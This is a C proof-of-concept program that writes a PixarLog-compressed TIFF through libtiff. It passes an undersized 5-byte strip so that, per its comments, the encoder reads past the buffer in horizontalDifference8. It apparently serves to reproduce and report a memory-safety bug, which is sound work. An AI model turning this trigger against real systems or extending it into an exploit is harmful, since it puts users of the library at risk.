#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tiffio.h>

int main(void) {
    const char *filename = "pixarlog_oob.tif";

    TIFF *tif = TIFFOpen(filename, "w");
    if (!tif) {
        fprintf(stderr, "Failed to open TIFF file for writing\n");
        return 1;
    }

    uint32_t width = 10;          // imagewidth
    uint32_t height = 1;          // imagelength (one row)
    uint16_t spp = 1;             // samples per pixel (grayscale)
    uint16_t bps = 8;             // 8-bit samples

    // Set up a minimal grayscale image using PixarLog compression
    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, width);
    TIFFSetField(tif, TIFFTAG_IMAGELENGTH, height);
    TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, spp);
    TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, bps);
    TIFFSetField(tif, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);
    TIFFSetField(tif, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_MINISBLACK);
    TIFFSetField(tif, TIFFTAG_COMPRESSION, COMPRESSION_PIXARLOG);
    TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP, (uint32_t)1);

    // Provide fewer bytes than a full row to trigger the bug.
    // llen = stride * imagewidth; with spp=1, stride is 1, so llen = 10 elements.
    // For 8-bit input, n = cc, so choose cc = 5 < llen to force a partial chunk.
    size_t cc = 5; // bytes provided; not a multiple of llen
    unsigned char *buf = (unsigned char *)malloc(cc);
    if (!buf) {
        fprintf(stderr, "malloc failed\n");
        TIFFClose(tif);
        return 1;
    }
    memset(buf, 0xAA, cc);

    // This call reaches PixarLogEncode(), which will compute n=cc and llen=stride*imagewidth.
    // Since n < llen, the loop still processes one iteration with llen, causing an OOB read
    // from bp by (llen - n) bytes inside horizontalDifference8().
    tmsize_t ret = TIFFWriteEncodedStrip(tif, 0, buf, (tmsize_t)cc);
    fprintf(stderr, "TIFFWriteEncodedStrip returned %zd\n", (ssize_t)ret);

    free(buf);

    // Close file (not strictly needed to trigger the bug, but keeps things tidy)
    TIFFClose(tif);

    fprintf(stderr, "Wrote %s (bug should have been triggered during encoding)\n", filename);
    return 0;
}
